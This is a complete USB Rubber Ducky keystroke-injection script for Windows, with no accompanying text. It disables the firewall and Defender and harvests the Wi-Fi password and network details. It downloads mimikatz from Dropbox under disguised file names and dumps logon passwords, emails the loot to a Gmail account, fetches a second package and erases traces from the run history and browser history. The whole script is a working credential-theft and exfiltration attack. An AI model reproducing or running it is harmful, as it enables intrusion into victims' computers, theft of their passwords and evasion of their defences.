DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING mode con:cols=18 lines=1
ENTER
STRING color FE
ENTER
DELAY 300
STRING netsh firewall set opmode mode=disable 
DELAY 300
ENTER
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $true
DELAY 300
ENTER
DELAY 200
STRING cd %USERPROFILE%
DELAY 200
ENTER
DELAY 200
REM --> Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:
DELAY 300
STRING  " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
DELAY 300
ENTER
DELAY 300
REM --> Creating A.txt
STRING netsh wlan show profiles %A% key=clear |  
DELAY 300
STRING findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
DELAY 300
ENTER
REM --> Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
DELAY 300
ENTER
DELAY 300
REM --> Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
DELAY 300
REM --> Get password
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
DELAY 300
ENTER
REM --> Delete A.txt
DELAY 300
STRING del A.txt
DELAY 300
ENTER
STRING cd %TEMP%
DELAY 300
ENTER
REM --> Create WIFI.txt
STRING echo SSID: %A%>>WIFI.txt & echo Network type: %B%>>WIFI.txt & echo Authentication: %C%>>WIFI.txt & echo Password: %D%>>WIFI.txt
DELAY 300
ENTER
DELAY 300
REM --> Get IPConfig /all
STRING ipconfig /all > ip.txt
DELAY 300
ENTER
REM --> Get Public IP
DELAY 300
STRING nslookup myip.opendns.com. resolver1.opendns.com > PublicIp.txt
DELAY 300
ENTER
DELAY 200
REM -----------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/8vl099fono8p49x/mimikatz32.mp3?dl=0','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/vu2l8iwfexa2h6k/mimikatz64.mp3?dl=0','%TEMP%\pw.exe');}
ENTER
DELAY 3000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type c:\pwlog.txt;
ENTER
DELAY 300
STRING privilege::debug
ENTER
STRING sekurlsa::logonPasswords full
ENTER
STRING exit
ENTER
STRING del %TEMP%\pw.exe
ENTER
DELAY 300
STRING cd %TEMP%
DELAY 300
ENTER
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
DELAY 300
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
DELAY 300
ENTER
STRING $SMTPInfo.EnableSsl = $true
DELAY 300
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL@gmail.com', 'EMAIL PASSWORD!');
DELAY 300
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
DELAY 300
ENTER
STRING $ReportEmail.From = 'EMAIL@gmail.com'
DELAY 300
ENTER
STRING $ReportEmail.To.Add('EMAIL@gmail.com')
DELAY 300
ENTER
STRING $ReportEmail.Subject = 'Ducky Report'
DELAY 300
ENTER
STRING $ReportEmail.Body = (Get-Content ip.txt,PublicIp.txt,WIFI.txt | out-string)
DELAY 300
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
DELAY 300
ENTER
DELAY 300
STRING $SMTPInfo.Send($ReportEmail)
DELAY 300
ENTER
STRING exit
ENTER
DELAY 300 
STRING del WIFI.txt
DELAY 300
ENTER
DELAY 300
STRING del PublicIp.txt
DELAY 300
ENTER
DELAY 300
STRING del ip.txt
DELAY 300
ENTER
REM ---------------------use parse_Invoke-Mimikatz by Russel Van Tuyl to find current users' password
DELAY 300
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://dl.dropboxusercontent.com/s/90czdj5yexv2gs1/dist.zip?dl=0', '%TEMP%\dist.zip')
DELAY 300
ENTER
DELAY 300
STRING powershell 
ENTER
DELAY 300
STRING Add-Type -A System.IO.Compression.FileSystem
ENTER
DELAY 300
STRING [IO.Compression.ZipFile]::ExtractToDirectory('dist.zip', 'dist')
ENTER
DELAY 300
STRING EXIT
ENTER
DELAY 300
STRING del dist.zip
ENTER
DELAY 300
STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
DELAY 300
ENTER
DELAY 300
STRING netsh firewall set opmode mode=enable
DELAY 300
ENTER
DELAY 300
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $false
DELAY 300
ENTER
STRING exit
DELAY 300
ENTER
STRING RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 4351
DELAY 300
ENTER
DELAY 300
STRING RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
ENTER
DELAY 300
STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
DELAY 300
ENTER
DELAY 300
STRING exit
DELAY 300
ENTER